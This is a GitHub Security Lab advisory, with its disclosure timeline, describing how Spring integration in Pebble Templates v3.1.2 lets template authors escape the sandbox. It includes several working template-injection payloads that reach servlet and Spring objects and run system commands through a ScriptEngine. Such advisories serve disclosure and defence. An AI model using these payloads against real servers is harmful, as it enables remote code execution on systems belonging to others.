<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">April 1, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-050: Arbitrary code execution in Pebble Templates</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/pwntester">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/125701?s=35" height="35" width="35">
        <span>Alvaro Munoz</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      
<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>
<ul>
  <li>03/23/2020: Asked for a private way of reporting the issue at https://github.com/PebbleTemplates/pebble/issues/501</li>
  <li>03/26/2020: Sent report through private Github Security Advisory discussion.</li>
  <li>06/29/2020: Requested status update with no response.</li>
  <li>07/15/2020: Requested status update with no response.</li>
  <li>10/09/2020: Requested status update with no response.</li>
  <li>01/08/2021: Requested status update with no response.</li>
  <li>03/25/2021: Disclosure deadline reached.</li>
  <li>04/01/2021: Publication as per our <a href="https://securitylab.github.com/advisories/#policy">disclosure policy</a>.</li>
</ul>

<h2 id="summary">Summary</h2>

<p>When Spring integration is enabled, an attacker that is able to modify Template contents may execute arbitrary Java code or run arbitrary system commands with the same privileges as the account running the Servlet container.</p>

<h2 id="product">Product</h2>

<p>Pebble Templates</p>

<h2 id="tested-version">Tested Version</h2>

<p>v3.1.2</p>

<h2 id="details">Details</h2>

<p>Even though Pebble does a great job sandboxing the template engine by not allowing dangerous methods to be invoked, exposing Spring beans and Servlet related objects (such as the Servlet Context) may introduce a variety of objects which can be used to bypass the Pebble sandbox. Deep inspection of the exposed objects’ object graph allows an attacker to get access to objects that allow them to instantiate arbitrary Java objects. According to the <a href="https://pebbletemplates.io/wiki/guide/spring-integration/">documentation</a>:</p>

<blockquote>
  <p>HttpServletRequest object is available to the template.
HttpServletResponse is available to the template.
HttpSession is available to the template.
Spring beans are now available to the template.</p>
</blockquote>

<p>In addition, Spring’s <a href="https://github.com/spring-projects/spring-framework/blob/master/spring-webmvc/src/main/java/org/springframework/web/servlet/view/AbstractTemplateView.java">AbstractTemplateView</a> exposes by default the <code class="language-plaintext highlighter-rouge">springMacroRequestContext</code> variable; an instance of <a href="https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/servlet/support/RequestContext.html">RequestContext</a>.</p>

<p>There are two main approaches to bypass the sandbox: 1) accessing the Servlet context, and 2) accessing the Spring application context beans.</p>

<h3 id="servlet-context">Servlet context</h3>

<p>Servlet context can be accessed through:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">request.servletContext</code></li>
  <li><code class="language-plaintext highlighter-rouge">springMacroRequestContext.webApplicationContext.servletContext</code></li>
  <li><code class="language-plaintext highlighter-rouge">beans.servletContext</code></li>
</ul>

<p>On a Tomcat server the Servlet context will contain the <code class="language-plaintext highlighter-rouge">org.apache.tomcat.InstanceManager</code> attribute which enables an attacker to instantiate arbitrary objects. Note that the same class (regardless of its name) is available on other servlet containers such as Jetty and similar classes are available in other servers. For example JBoss/WildFly exposes <code class="language-plaintext highlighter-rouge">org.wildfly.extension.undertow.deployment.UndertowJSPInstanceManage</code>.</p>

<p>We can then try to run arbitrary Java code using a <code class="language-plaintext highlighter-rouge">ScriptEngine</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{{ request.servletContext.getAttribute('org.apache.tomcat.InstanceManager').newInstance('javax.script.ScriptEngineManager').getEngineByName('js').eval("java.lang.Runtime.getRuntime().exec('id')") }}
</code></pre></div></div>

<p>There are other objects in the Servlet context that can lead to Remote Code Execution. We can list them with:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;ul&gt;
{% for attr in request.servletContext.getAttributeNames() %}
	&lt;li&gt;{{ attr }}&lt;/li&gt;
{% endfor %}
&lt;/ul&gt;
</code></pre></div></div>

<p>In a sample Tomcat server we get:</p>

<ul>
  <li>javax.servlet.context.tempdir</li>
  <li>org.apache.catalina.resources</li>
  <li>org.springframework.web.context.WebApplicationContext.ROOT</li>
  <li>org.springframework.web.context.support.ServletContextScope</li>
  <li>org.apache.tomcat.InstanceManager</li>
  <li>org.apache.catalina.jsp_classpath</li>
  <li>javax.websocket.server.ServerContainer</li>
  <li>org.apache.tomcat.JarScanner</li>
  <li>org.springframework.web.servlet.FrameworkServlet.CONTEXT.dispatcherServlet</li>
</ul>

<p>Some of these will allow us to access the Spring application context which in turn will give us access to all registered Spring beans.</p>

<h2 id="spring-beans">Spring Beans</h2>

<p>Spring Beans can be accessed in a number of ways. eg:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">springMacroRequestContext.webApplicationContext.getBean(BEAN_NAME)</code></li>
  <li><code class="language-plaintext highlighter-rouge">beans.BEAN_NAME</code></li>
  <li><code class="language-plaintext highlighter-rouge">request.servletContext.getAttribute('org.springframework.web.context.WebApplicationContext.ROOT').getBean(BEAN_NAME)</code></li>
</ul>

<p>We can list them with:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;ul&gt;
{% for bean in springMacroRequestContext.webApplicationContext.getBeanDefinitionNames() %}
	&lt;li&gt;{{ bean }}&lt;/li&gt;
{% endfor %}
&lt;/ul&gt;
</code></pre></div></div>

<p>The first bypass is to access arbitrary <code class="language-plaintext highlighter-rouge">Class</code> objects. e.g:</p>

<p><code class="language-plaintext highlighter-rouge">{{ springMacroRequestContext.webApplicationContext.beanDefinition('application').beanClass.protectionDomain.classLoader.loadClass('javax.script.ScriptEngineManager') }}</code></p>

<p>We cant turn this into RCE by using the Jackson ObjectMapper to instantiate the ScriptManager for us:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{% set clzz = springMacroRequestContext.webApplicationContext.beanDefinition('application').beanClass.protectionDomain.classLoader.loadClass('javax.script.ScriptEngineManager') %}
{{ beans.jacksonObjectMapper.enableDefaultTyping().readValue("{}", clzz).getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec('id')") }}
</code></pre></div></div>

<p>Since we can also access the Pebble engine, we can even turn the sandbox off.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{% set opts = beans.pebbleEngine.evaluationOptions.setAllowUnsafeMethods(true) %}
{{ "".class.forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec('id')") }}
</code></pre></div></div>

<h4 id="impact">Impact</h4>

<p>This issue may lead to Remote Code Execution (RCE).</p>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/pwntester">@pwntester (Alvaro Munoz)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include <code class="language-plaintext highlighter-rouge">GHSL-2020-050</code> in any communication regarding this issue.</p>


